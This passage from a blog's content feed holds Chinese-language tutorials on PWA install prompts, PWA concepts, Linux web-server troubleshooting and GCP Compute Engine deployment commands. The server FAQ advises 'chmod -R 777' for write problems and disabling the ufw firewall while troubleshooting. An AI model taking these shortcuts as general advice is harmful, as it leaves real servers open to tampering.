上進行提示。</p><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img alt="" src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/GPJdkXcpNLR30r2zo7RR.png?auto=format&w=845"></p></blockquote><p>透過適當的 RWD 設計，讓按鈕可以更好看。</p><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img alt="" src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/L01AoSoy7LNk1ttMMax0.png?auto=format&w=845"></p></blockquote><h3 id="融入到選單"><a href="#融入到選單" class="headerlink" title="融入到選單"></a>融入到選單</h3><p>如果網站本來就有選單，可以透過設計把按鈕融入到選單中，記得不要打擾使用者使用選單並透過文案告知安裝好處。</p><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img alt="" src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/aT7NHi8lbsZW8TOm3Gaw.png?auto=format&w=845"></p></blockquote><h3 id="到達頁面"><a href="#到達頁面" class="headerlink" title="到達頁面"></a>到達頁面</h3><p>當使用者進入到達頁面時，蠻適合趁機推廣安裝，此時記得</p><ul><li>配合使用者導流進來的關鍵字給一個想要安裝的理由</li><li>確認提示的位置夠明顯，推廣的標語要夠明確</li></ul><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img alt="" src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/7q09M12HFxgIiWhKPGma.png?auto=format&w=845"></p></blockquote><h3 id="Banner-提示"><a href="#Banner-提示" class="headerlink" title="Banner 提示"></a>Banner 提示</h3><p>大部分的手機使用者已經習慣 banner 跳出提示了，所以其實也可以這麼做，但有兩個重點:</p><ul><li>但盡量等到使用者對您的網站表現出興趣後，再顯示 Banner</li><li>如果使用者關閉了，就不要再次顯示。除非觸發了一個轉化事件，例如在購買或註冊帳戶</li><li>簡要說明安裝 PWA 的價值</li></ul><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img alt="" src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/7fLCQQhdk2OzrQD3Xh4E.png?auto=format&w=845"></p></blockquote><h3 id="Temporary-UI"><a href="#Temporary-UI" class="headerlink" title="Temporary UI"></a>Temporary UI</h3><p>透過彈出通知提示，幾點注意事項</p><ul><li>4 到 7 秒，有足夠的時間查看它並做出反應但又不妨礙操作</li><li>避免將其顯示在其他臨時 UI 上</li><li>等到有接受強烈興趣信號後再使用此模式，例如重複訪問、用戶登錄或類似的轉化事件</li></ul><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img alt="" src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/6DySYRtyegazEfMcWXQL.png?auto=format&w=845"></p></blockquote><h3 id="轉換後提示"><a href="#轉換後提示" class="headerlink" title="轉換後提示"></a>轉換後提示</h3><p>像是購買後的結帳清單頁面，使用者明顯完成一次轉化，代表其實有興趣，這時候就蠻適合推薦。</p><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img alt="" src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/DrepSPFAm64d5cvTFoXe.png?auto=format&w=845"></p></blockquote><h3 id="購買或結帳流程中適度推廣"><a href="#購買或結帳流程中適度推廣" class="headerlink" title="購買或結帳流程中適度推廣"></a>購買或結帳流程中適度推廣</h3><p>如果安裝能有獨特的優惠，或是能夠有相關優點就要透過提示告知，像是能夠接收推播來追蹤商品等等，但要注意不要影響了原來的使用者歷程。</p><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img alt="" src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/bOYZM2UiWK5itVSpjKWO.png?auto=format&w=845"></p></blockquote><h3 id="登入頁面過程中提示"><a href="#登入頁面過程中提示" class="headerlink" title="登入頁面過程中提示"></a>登入頁面過程中提示</h3><p>考慮在登入頁面中置入推薦，因為使用者已完成註冊，這時候推薦其實不影響，算是適合放置的地方。</p><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img alt="" src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/PQXqSqtwRSwyELdJMjtd.png?auto=format&w=845"></p></blockquote><h3 id="把推廣融入在內容中"><a href="#把推廣融入在內容中" class="headerlink" title="把推廣融入在內容中"></a>把推廣融入在內容中</h3><p>新聞文章或其他訊息列表間出現一個推薦安裝的訊息，底下三個注意事項:</p><ul><li>限制頻率</li><li>能夠取消</li><li>記住使用者曾選擇關閉</li></ul><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img alt="" src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/LS5qSE2vicfjRBBkA47a.png?auto=format&w=845"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 開箱解密</title>
      <link href="/2021/09/02/progressive-web-application/pwa-progressive-web-app-introduction/"/>
      <url>/2021/09/02/progressive-web-application/pwa-progressive-web-app-introduction/</url>
      
        <content type="html"><![CDATA[<p>Progressive Web App (PWA) 有三個概念</p><ol><li>Progressive: 漸進增強</li><li>Web: 使用當下最新潮的 Web API</li><li>App: 建立跨平台 Web 應用程式</li></ol><p>使用當下最新潮的 Web API 用漸進增強的概念來建立跨平台 Web 應用程式。</p><blockquote><p>目的是讓體驗、效能接近原生 App</p></blockquote><p>接下來小編會帶著大家一起開箱一波 PWA，Progressive Web App (PWA) 是在 2015 年，由兩位大大弗朗西斯貝里曼 (設計師)、亞歷克斯羅素 (Chrome 工程師) 所提出的概念。</p><p>那到底 PWA 在期待和表達些什麼，漸進式增強到底有多強?</p><h2 id="什麼是-Progressive-Web-App"><a href="#什麼是-Progressive-Web-App" class="headerlink" title="什麼是 Progressive Web App?"></a>什麼是 Progressive Web App?</h2><p>Progressive Web App 透過瀏覽器技術組合讓 PWA 除了網頁優勢也能夠有 native apps 的優點。</p><blockquote><p><strong>將網站優化成 PWA 只會讓網站更好更加分</strong></p></blockquote><ul><li><p>Native App:</p><ul><li>整合硬體效能、離線資源提供流暢體驗</li><li>取得較不方便</li></ul></li><li><p>網頁:</p><ul><li>相對原生 App 無法完整使用硬體功能，但能運作在較低端的設備上</li><li>唯一觸及全平台的管道且容易被搜尋和取得</li></ul></li><li><p>Progressive Web App:</p><ul><li>網頁容易被搜尋並能透過連結被安裝使用</li><li>運用最新的網頁技術更深度的整合硬體資源，功能只會越來越豐富</li></ul></li></ul><p>那 Progressive Web App 可靠嗎?</p><p>這個問題其實是問 Service Worker 在各瀏覽器上的運作穩定了嗎?</p><p>隨著瀏覽器的技術進步，這個答案是肯定的。目前已經有蠻多採用 PWA 的大公司，也可以發現 PWA 會以 Lite 來做命名，來增加產品的觸及和普及。</p><ul><li>IG Lite</li><li>Twitter Lite</li><li>Youtube TV</li><li>Telegram Z</li></ul><p>Chrome OS 執行 PWA<br><a href="https://www.ithome.com.tw/news/137000">https://www.ithome.com.tw/news/137000</a></p><p>隨著 Google PWA 開發上進展 Chromebook 用戶也能在 Play Store 下載 Twitter 及 Youtube TV 的 PWA。</p><p>目標是透過現代化瀏覽器讓 PWA 在任何平臺上都能順暢執行 (Windows、ChromeOS、macOS、iOS、Android)，去解決像是 Chrome OS 裝置跑 Android App 效能低落的問題。</p><h2 id="Progressive-Web-App-在商業上的幫助"><a href="#Progressive-Web-App-在商業上的幫助" class="headerlink" title="Progressive Web App 在商業上的幫助"></a>Progressive Web App 在商業上的幫助</h2><p>PWA 在不改變使用者習慣的前提下，能夠直接優化商業型的網站</p><ol><li>透過 Responsive Design 來優化不同裝置的體驗</li><li>提供主畫面上的 Icon 讓使用者不需透過瀏覽器執行 Web Apps</li></ol><p>在商業的應用上可以做到:</p><ul><li>增加觸及，Web 是唯一管道可以觸及全部平台</li><li>比起網頁可以增加更多互動</li><li>減少安裝的容量損耗</li><li>對於較差的硬體能得到更好的效能</li><li>提供 “Lite” 輕量化的體驗</li></ul><p>小編趁這次開箱也翻譯整理了<a href="https://linyencheng.github.io/2021/09/30/progressive-web-application/pwa-case-study-rakuten-24/?utm_source=link&utm_medium=article&utm_campaign=internal_link">樂天 24 優化站台成 PWA 後所帶來的好處</a>給大家參考。</p><h2 id="怎麼實作一個-PWA"><a href="#怎麼實作一個-PWA" class="headerlink" title="怎麼實作一個 PWA?"></a>怎麼實作一個 PWA?</h2><p>PWA 提供了一種新的設計哲學，包含像是一些特殊的實作模式、API、配置。</p><ul><li><a href="https://linyencheng.github.io/2021/09/03/progressive-web-application/pwa-add-to-home-screen-a2hs/?utm_source=link&utm_medium=article&utm_campaign=internal_link">推薦安裝提示</a></li><li><a href="https://linyencheng.github.io/2021/09/04/progressive-web-application/pwa-manifest/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Manifest: PWA 配置檔</a></li><li><a href="https://linyencheng.github.io/2021/09/05/progressive-web-application/pwa-service-worker/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Service Worker 讓網頁支援離線快取及推播</a></li></ul><p>因為這些實作，讓 App 能夠漸進式的增強，而一般使用者在正常使用上是分別不出來是不是 PWA。</p><p>一個完整的 PWA 主要包含以下功能，而 Chrome 也提供了 <a href="https://linyencheng.github.io/2021/10/03/progressive-web-application/pwa-audit/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Lighthouse 來評估是否完整達到 PWA 的規範</a></p><ul><li>可以離線運作 (Works Offline)<ul><li><a href="https://linyencheng.github.io/2021/09/16/progressive-web-application/pwa-web-storage/?utm_source=link&utm_medium=article&utm_campaign=internal_link">用戶端儲存快取與離線後備頁面</a></li></ul></li><li><a href="https://linyencheng.github.io/2021/09/03/progressive-web-application/pwa-add-to-home-screen-a2hs/?utm_source=link&utm_medium=article&utm_campaign=internal_link">可以被安裝 (Installable)</a></li><li><a href="https://linyencheng.github.io/2021/09/26/progressive-web-application/pwa-push-notificatoin-introduction/?utm_source=link&utm_medium=article&utm_campaign=internal_link">可以收推播 (Push Notifications)</a></li></ul><p>底下列出更完整 PWA 的原則:</p><ul><li>Discoverable: 網頁本來就能夠被搜尋引擎爬取</li><li>Installable: 需要完成適當配置讓 App 能夠被安裝</li><li>Linkable: 可以透過連結分享</li><li>Re-engageable: 可以接收推播互動</li><li>Secure: 必須要透過 https 提供安全的保證</li><li>Network independent: 可以離線運作或用快取運行</li><li>Progressively enhanced: 漸進式的增強，瀏覽器越新支援的功能就越多</li><li>Responsively designed: 透過 RWD 的設計能夠讓更多裝置使用</li></ul><h2 id="PWA-漸進式增強"><a href="#PWA-漸進式增強" class="headerlink" title="PWA 漸進式增強"></a>PWA 漸進式增強</h2><p>PWA 其實不是新的觀念，經過 6 年的演變也真的跟名稱一樣一直都在進行漸進式的增強 (Progressive Enhancement)，舉例來說，近幾年 Chrome 也一直在不斷進步，最近連 NFC 也能透過網頁直接讀取。</p><p>有個計劃是 Project Fugo，會將開發中與即將開發的先進技術記錄在這個專案進程中，這其中有個重點，就是有在這個專案中的功能，大家就先不要急著先自己實作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 因為在不久的將來我們只需要</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;厲害的功能&quot;</span> <span class="keyword">in</span> <span class="title class_">Window</span>) &#123;</span><br><span class="line">  <span class="comment">// 來點厲害功能吧</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><a href="https://linyencheng.github.io/2021/09/10/progressive-web-application/pwa-badging-for-app-icon/?utm_source=link&utm_medium=article&utm_campaign=internal_link">通知數字 (Badging API)</a></li><li><a href="https://linyencheng.github.io/2021/09/15/progressive-web-application/pwa-geo-location-api/?utm_source=link&utm_medium=article&utm_campaign=internal_link">位置存取 (Geo Location API)</a></li><li><a href="https://linyencheng.github.io/2021/09/19/progressive-web-application/pwa-web-nfc/?utm_source=link&utm_medium=article&utm_campaign=internal_link">NFC Reader</a></li><li><a href="https://linyencheng.github.io/2021/09/20/progressive-web-application/pwa-wake-lock/?utm_source=link&utm_medium=article&utm_campaign=internal_link">喚醒鎖維持螢幕長亮</a></li><li><a href="https://linyencheng.github.io/2021/09/21/progressive-web-application/pwa-web-share/?utm_source=link&utm_medium=article&utm_campaign=internal_link">分享內容 (Web Share API)</a></li><li><a href="https://linyencheng.github.io/2021/09/22/progressive-web-application/pwa-contact-picker/?utm_source=link&utm_medium=article&utm_campaign=internal_link">存取通訊錄 (Contact Picker API)</a></li><li><a href="https://linyencheng.github.io/2021/09/23/progressive-web-application/pwa-background-sync/?utm_source=link&utm_medium=article&utm_campaign=internal_link">定期背景同步 (Periodic Background Sync API)</a></li><li><a href="https://linyencheng.github.io/2021/09/24/progressive-web-application/pwa-idle-detection/?utm_source=link&utm_medium=article&utm_campaign=internal_link">裝置閒置偵測 (Idle Detection API)</a></li><li><a href="https://linyencheng.github.io/2021/09/25/progressive-web-application/pwa-notification/?utm_source=link&utm_medium=article&utm_campaign=internal_link">顯示通知 (Notification API)</a></li><li><a href="https://linyencheng.github.io/2021/10/02/progressive-web-application/pwa-app-shortcuts/?utm_source=link&utm_medium=article&utm_campaign=internal_link">程式快速啟動選單 (App Shortcut)</a></li></ul><h2 id="PWA-有什麼好處，值得我們將站台升級嗎"><a href="#PWA-有什麼好處，值得我們將站台升級嗎" class="headerlink" title="PWA 有什麼好處，值得我們將站台升級嗎?"></a>PWA 有什麼好處，值得我們將站台升級嗎?</h2><ul><li>即開即用: 安裝後能透過 Service Workers 快取資源，減少載入時間有機會做到即開即用</li><li>更版升級快速: 可以做到只更新有改變的相關資源，比起 Native app 相對每次更新的修改都較小</li><li>提升操作體驗: Icon、啟動畫面、全螢幕執行的操作體驗都更接近 Native App</li><li>更好的互動: 透過接受推播能夠有更好的互動體驗</li></ul><h2 id="將-PWA-上架到市集"><a href="#將-PWA-上架到市集" class="headerlink" title="將 PWA 上架到市集"></a>將 PWA 上架到市集</h2><p>目前 Progressive Web App <a href="https://linyencheng.github.io/2021/10/04/progressive-web-application/pwa-publish-a-pwa-to-store/?utm_source=link&utm_medium=article&utm_campaign=internal_link">能透過工具搭配幾乎零開發成本的打包</a>就能上架到以下市集:</p><ul><li>Play Store (Chrome OS)</li><li>Micorsoft Store</li><li>Samsung Galaxy Store</li></ul><p>既然可以直接安裝為什麼要上架到市集?</p><ul><li>可以容易搜尋</li><li>更高的熟悉與信任度</li><li>PWA 打包幾乎沒有成本</li></ul><h2 id="Progressive-Web-App-的未來"><a href="#Progressive-Web-App-的未來" class="headerlink" title="Progressive Web App 的未來"></a>Progressive Web App 的未來</h2><p>小編其實從十年前就開始接觸 Web App，6 年前開始工作後也開始持續關注 PWA 的概念。</p><p>這幾年下來，漸漸出現採用 HTML5 的技術電視平台、Firefox OS，不過發展到後期都算是失敗的作品。</p><p>近兩年開始看到 Outlook、Telegram 的進步才又有了信心，去年微軟的 Edge 也正式加入 Google 陣營，可以說是為 PWA 的發展又推進了一步。</p><p>隨著元件化、模組化的概念發展，小編認為未來前端會趨向不寫程式的狀況，只需要透過模組的組合還有元件的樣式調整就能夠組成前端的 Web App，PWA 也會隨著 Chrome 的進步而越來越強大。</p><p>Progressive Web App 從名字可以看出有三個重點</p><ul><li>Progressive: 漸進式增強</li><li>Web: 網路技術</li><li>App: 應用程式</li></ul><h3 id="Project-Fugu"><a href="#Project-Fugu" class="headerlink" title="Project Fugu"></a>Project Fugu</h3><p>底下這個網站記錄了 Chrome 團隊即將開發的新功能和潛在功能的完整列表，就讓我們繼續期待 PWA 接下來的發展吧!</p><p><a href="https://fugu-tracker.web.app/">https://fugu-tracker.web.app/</a></p>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>架設你的網站伺服器</title>
      <link href="/2021/07/07/tool-linux-server-faq/"/>
      <url>/2021/07/07/tool-linux-server-faq/</url>
      
        <content type="html"><![CDATA[<p>通常推薦用 Linux 架設網頁伺服器，作業系統則推薦使用 CentOS 或是 Ubuntu。架站最快方式是安裝 Nginx 並配置前後端相關服務。Nginx 的用途主要提供反向代理，方便我們進行服務界接和相關路徑設定，也提供部屬靜態網頁的簡易設定，更多相關的設定歡迎參考我之前寫過的 <a href="https://linyencheng.github.io/2019/07/13/tool-nginx/?utm_source=link&utm_medium=article&utm_campaign=internal_link">常用的 Nginx Config 與相關指令教學</a>。</p><p>在架設完不管是地端或是雲端的伺服器後，通常會遇到五個問題</p><ol><li>記憶體不足</li><li>網路連線設定</li><li>後端服務管理</li><li>檔案權限設定</li><li>網頁中文顯示亂碼</li></ol><h2 id="伺服器記憶體不足"><a href="#伺服器記憶體不足" class="headerlink" title="伺服器記憶體不足"></a>伺服器記憶體不足</h2><p>如果開了記憶體較小的機器，有時候會遇到記憶體較滿卡頓的情況，可以幫主機加上用硬碟空間的交換記憶體 swap，因為像前幾年小編使用 EC2 預設是沒有的。</p><ul><li><code>top</code> 或 <code>htop</code> 看一下是不是一直在交換</li><li><code>watch -n 1 free -m</code> 只看記憶體</li></ul><ol><li>設定交換記憶體大小: <code>sudo fallocate -l 2G /swapfile</code></li><li>設定檔案權限: <code>sudo chmod 600 /swapfile</code></li><li>設定為交換記憶體: <code>sudo mkswap /swapfile</code></li><li>啟用交換記憶體: <code>sudo swapon /swapfile</code></li><li>修改系統設定: <code>sudo nano /etc/fstab</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在最後一行加入修改系統設定，讓下次重開機時也會生效</span></span><br><span class="line">/swapfile   none swap    sw 0 0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="伺服器網路連線設定"><a href="#伺服器網路連線設定" class="headerlink" title="伺服器網路連線設定"></a>伺服器網路連線設定</h2><ol><li><p>防火牆設定: 會碰到這個一般是都弄好了，但怎麼都看不到網頁，若停用防火牆後以使用，代表<a href="https://www.peterdavehello.org/2016/01/ubuntu-based-gnulinux-firewall-ufw-essential-config/">防火牆需要設定</a>。</p><ul><li><code>sudo ufw disable</code> 停用</li><li><code>sudo ufw allow from 192.168.0.0/16</code> 允許通過</li></ul></li><li><p>連接埠 (Port) 的設定: 可能程式沒寫好錯誤處理，又剛好選到的 port 跟其他服務一樣。</p><ul><li>看一下目前這個 port 是不是有被使用: <code>netstat -tulpn | grep LISTEN</code></li><li>透過指令查看特殊 Port 的服務是否正常 <code>telnet www.google.com 80</code></li><li>模擬斷線: iptables -A OUTPUT -p TCP –dport {PORT} -j REJECT</li></ul></li><li><p>tcp timeout 設定: 預設值不一定適合，為了效能可以依照需求設定。</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> sysctl -w net.ipv4.tcp_keepalive_time=110</span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure><ol start="4"><li>somaxconn 數值設定: 也是調整效能用。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.core.somaxconn=512</span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure><h2 id="伺服器後端服務管理"><a href="#伺服器後端服務管理" class="headerlink" title="伺服器後端服務管理"></a>伺服器後端服務管理</h2><p>這裡以 Node.js 為例，建置時 NODE_ENV 設定為 production，網路上的大大<a href="https://www.dynatrace.com/news/blog/the-drastic-effects-of-omitting-node_env-in-your-express-js-applications/">測試</a>看起來有差，為了提升效能也建議使用像是 express-redis-cache 這類的套件，如果是較為靜態的資料，就可以透過將資源短暫快取在記憶體中，減少對資料庫的負擔。</p><p>在遠端連接 Linux 伺服器中通常不會有桌面，通常會需要註冊成系統服務或是使用 FOREVER, PM2 這類的工具，會是透過管理工具進行管理，Node.js 中常見的工具為 PM2。也因為 Node.js 是單線程，效能優化上最簡單就是透過 <a href="http://pm2.keymetrics.io/docs/usage/cluster-mode/">cluster mode (類似 nginx 配合多核心的設定可以無痛升級效能)</a>。</p><p>常用的指令如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pm2 save</span><br><span class="line">pm2 monit</span><br><span class="line">pm2 <span class="built_in">ls</span></span><br><span class="line">pm2 serve</span><br></pre></td></tr></table></figure><h2 id="伺服器檔案權限設定"><a href="#伺服器檔案權限設定" class="headerlink" title="伺服器檔案權限設定"></a>伺服器檔案權限設定</h2><p>檔案權限有時候會發現寫不進去或無法執行，全開的話就 chmod -R 777 .&#x2F;*，不需要執行的話就 755，執行 (+X)，這裡可以看到三個數字，就是搭配在 linux 上使用指令 ls -l 看到三組的 rwx，其中 r&#x3D;4 (讀)，w&#x3D;2 (寫)，x&#x3D;1 (執行)</p><table><thead><tr><th>User</th><th>Group</th><th>Other</th></tr></thead><tbody><tr><td>7</td><td>6</td><td>4</td></tr><tr><td>rwx</td><td>rw</td><td>r</td></tr><tr><td>7</td><td>7</td><td>7</td></tr><tr><td>rwx</td><td>rwx</td><td>rwx</td></tr></tbody></table><h3 id="Permission-denied-while-connecting-to-upstream"><a href="#Permission-denied-while-connecting-to-upstream" class="headerlink" title="Permission denied while connecting to upstream"></a>Permission denied while connecting to upstream</h3><p>如果 Nginx 設置了 <code>proxy_pass</code> 卻沒有作用的時候，這時候可以透過 <code>tail -f /var/log/nginx/*.log</code> 指令來查看相關錯誤，如果發現 <code>Permission denied while connecting to upstream</code>，可能就是 SELinux 權限的問題，這時候如果只是需要先測試的話，可以</p><ol><li>設定連接權限: <code>setsebool httpd_can_network_connect on -P</code></li><li>查看是否設定成功:<code>getsebool -a | grep httpd</code></li></ol><h2 id="Linux-網頁中文顯示亂碼"><a href="#Linux-網頁中文顯示亂碼" class="headerlink" title="Linux 網頁中文顯示亂碼"></a>Linux 網頁中文顯示亂碼</h2><p>這時候通常是因為沒有安裝字型，Cent OS 的話可以嘗試以下指令</p><ul><li>locale: 看一下是不是 zh_TW</li></ul><p>安裝字型，網路上有很多建議指令，各自都有成功或失敗，但都安裝一次到位最好</p><ul><li>yum -y install fonts-chinese</li><li>yum install m17n-db-common-cjk</li><li>yum install m17n-db-chinesesv</li><li>yum groupinstall chinese-support</li></ul>]]></content>
      
      
      <categories>
          
          <category> 雲端服務 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 雲端服務 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Cloud 技術培訓計畫闖關體驗</title>
      <link href="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/"/>
      <url>/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/</url>
      
        <content type="html"><![CDATA[<p>這次參加 GCP Cloud Study JAM 2021 體驗前後服務架設、Google Assistant、BigQuery 相關實作，值得一提的是 GCP 雖然提供圖形化管理介面，但大多功能都能用指令取代，這也代表相關配置與流程能透過程式碼來進行控管，進而降低錯誤的發生機率，更特別的地方是這次體驗的過程中，發現課程內容幾乎都是用 Cloud Shell 下指令的步驟當做教學。</p><blockquote><p>一個 Cloud Shell 介面可以完成八成的事情<br><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/GCPCloudShell.JPG" alt="GCPCloudShell"></p></blockquote><h2 id="Google-Cloud-開發者技術培訓計畫"><a href="#Google-Cloud-開發者技術培訓計畫" class="headerlink" title="Google Cloud 開發者技術培訓計畫"></a>Google Cloud 開發者技術培訓計畫</h2><p>Google 邀請台灣與港澳的開發人員只要在 6&#x2F;1 ~ 6&#x2F;30 期間加入 Cloud Study Jam 的開發者技術培訓計畫，在期限內報名並按照任務啟用就可以有 30 天的時間免費學習 Google Cloud 的相關技術，覺得不錯想說來推薦一下。</p><blockquote><p><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/GCPCloudStudyJAM2021.JPG" alt="GCPCloudStudyJAM2021"></p></blockquote><p>透過學習材料和相關 Lab 的操作，學習 Google Cloud Platform 上的應用開發和基礎架構。在完成各單元破關挑戰成功後，會得到相對應的獎章，算蠻有成就感的，讓有興趣的開發者們都有機會成為 GCP 大師!!!</p><blockquote><p><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/GCPCloudStudyJAM2021Profiles.png" alt="GCPCloudStudyJAM2021Profiles"></p></blockquote><h2 id="網站服務架設的三種方法"><a href="#網站服務架設的三種方法" class="headerlink" title="網站服務架設的三種方法"></a>網站服務架設的三種方法</h2><p>目前在 GCP 架設網站服務主要有三種方法:</p><ol><li>Google Compute Engine: 開虛擬機 (instances)，剩下導流、防火牆等都如同本機設定</li><li>Kubernetes (K8S): 管理容器的工具</li><li>Cloud Run: 用 Knative 來簡化 K8S 流程</li></ol><h3 id="Google-Compute-Engine"><a href="#Google-Compute-Engine" class="headerlink" title="Google Compute Engine"></a>Google Compute Engine</h3><ol><li>設定 region 和 zone: <code>gcloud config set compute/zone us-central1-f</code></li><li>透過控制台或是下指令: 設定機台 n1-standard-1 後，手動部屬並啟動前後端程式</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gcloud compute instances create backend \</span><br><span class="line">--machine-type=n1-standard-1 \</span><br><span class="line">--tags=backend \</span><br><span class="line">--metadata=startup-script-url=https://storage.googleapis.com/fancy-store-<span class="variable">$DEVSHELL_PROJECT_ID</span>/startup-script.sh</span><br><span class="line"></span><br><span class="line">gcloud compute instances create frontend \</span><br><span class="line"> --machine-type=n1-standard-1 \</span><br><span class="line"> --tags=frontend \</span><br><span class="line"> --metadata=startup-script-url=https://storage.googleapis.com/fancy-store-<span class="variable">$DEVSHELL_PROJECT_ID</span>/startup-script.sh</span><br></pre></td></tr></table></figure><ol start="3"><li>防火牆: 前端 8080 後端 8081-8082</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcloud compute firewall-rules create fw-fe \</span><br><span class="line"> --allow tcp:8080 \</span><br><span class="line"> --target-tags=frontend</span><br><span class="line">gcloud compute firewall-rules create fw-be \</span><br><span class="line"> --allow tcp:8081-8082 \</span><br><span class="line"> --target-tags=backend</span><br></pre></td></tr></table></figure><ol start="4"><li>建立樣板，方便之後做水平擴展</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcloud compute instance-templates create fancy-fe \</span><br><span class="line"> --source-instance=frontend</span><br><span class="line">gcloud compute instance-templates create fancy-be \</span><br><span class="line"> --source-instance=backend</span><br></pre></td></tr></table></figure><ol start="5"><li>群組管理，前端 8080 後端 8081 orders、8082 products</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gcloud compute instance-groups managed create fancy-fe-mig \</span><br><span class="line"> --base-instance-name fancy-fe \</span><br><span class="line"> --size 2 \</span><br><span class="line"> --template fancy-fe</span><br><span class="line">gcloud compute instance-groups managed create fancy-be-mig \</span><br><span class="line"> --base-instance-name fancy-be \</span><br><span class="line"> --size 2 \</span><br><span class="line"> --template fancy-be</span><br><span class="line"></span><br><span class="line">gcloud compute instance-groups set-named-ports fancy-fe-mig \</span><br><span class="line"> --named-ports frontend:8080</span><br><span class="line">gcloud compute instance-groups set-named-ports fancy-be-mig \</span><br><span class="line"> --named-ports orders:8081,products:8082</span><br></pre></td></tr></table></figure><p>各步驟中會常用的指令:</p><ul><li>列出<ul><li>主機: <code>gcloud compute instances list</code></li><li>樣板: <code>gcloud compute instance-templates list</code></li></ul></li><li>停機: <code>gcloud compute instances stop frontend</code></li></ul><h4 id="設定監控-health-checks"><a href="#設定監控-health-checks" class="headerlink" title="設定監控 health-checks"></a>設定監控 health-checks</h4><p>設定監控的方式理論上各個服務都相同，就是針對 port 或是路徑去做監控，這裡就只貼上 Google Compute Engine 的案例。</p><ol><li>設定 health-checks</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gcloud compute health-checks create http 